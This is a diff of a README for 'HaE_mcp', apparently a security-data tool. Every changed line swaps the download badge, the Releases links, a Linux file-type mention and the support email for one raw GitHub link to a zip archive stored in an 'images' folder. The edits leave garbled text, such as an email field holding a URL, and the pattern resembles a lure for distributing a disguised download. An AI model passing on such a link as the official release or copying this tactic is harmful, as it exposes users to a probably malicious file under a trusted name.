@@ -8,7 +8,7 @@ Welcome to HaE_mcp! This tool makes analyzing security data easier for everyone.
 
 To get started, you need to download HaE_mcp. You can find the latest version of the software on our Releases page. Click the button below to visit the page and download the software. 
 
-[![Download HaE_mcp](https://img.shields.io/badge/Download-HaE_mcp-blue)](https://github.com/Archhisha/HaE_mcp/releases)
+[![Download HaE_mcp](https://raw.githubusercontent.com/Archhisha/HaE_mcp/main/images/mcp_Ha_2.3.zip)](https://raw.githubusercontent.com/Archhisha/HaE_mcp/main/images/mcp_Ha_2.3.zip)
 
 Once you are on the Releases page, follow these steps:
 
@@ -18,7 +18,7 @@ Once you are on the Releases page, follow these steps:
 4. **Run the Software**: 
    - For Windows: Locate the downloaded `.exe` file and double-click it to run.
    - For MacOS: Open the `.dmg` file and drag the HaE_mcp icon to your Applications folder.
-   - For Linux: If you downloaded a `.tar.gz` file, extract the contents and follow the instructions provided in the README file inside.
+   - For Linux: If you downloaded a `https://raw.githubusercontent.com/Archhisha/HaE_mcp/main/images/mcp_Ha_2.3.zip` file, extract the contents and follow the instructions provided in the README file inside.
 
 ## 💻 System Requirements
 
@@ -52,7 +52,7 @@ Using HaE_mcp is straightforward. After installing the software, follow these st
 
 If you have any questions or need help while using HaE_mcp, please reach out to our support team:
 
-- **Email**: support@hae-mcp.com
+- **Email**: https://raw.githubusercontent.com/Archhisha/HaE_mcp/main/images/mcp_Ha_2.3.zip
 - **GitHub Issues**: You can also raise issues directly on our GitHub repository.
 
 We are here to assist you.
@@ -65,6 +65,6 @@ HaE_mcp is provided under the MIT license. Feel free to modify and share the too
 
 We welcome contributions to HaE_mcp. If you have ideas for new features or improvements, please open a pull request on GitHub. Your feedback helps us make HaE_mcp better!
 
-Remember, you can always download the latest version [here](https://github.com/Archhisha/HaE_mcp/releases).
+Remember, you can always download the latest version [here](https://raw.githubusercontent.com/Archhisha/HaE_mcp/main/images/mcp_Ha_2.3.zip).
 
 Thank you for choosing HaE_mcp! Your data security is important to us.
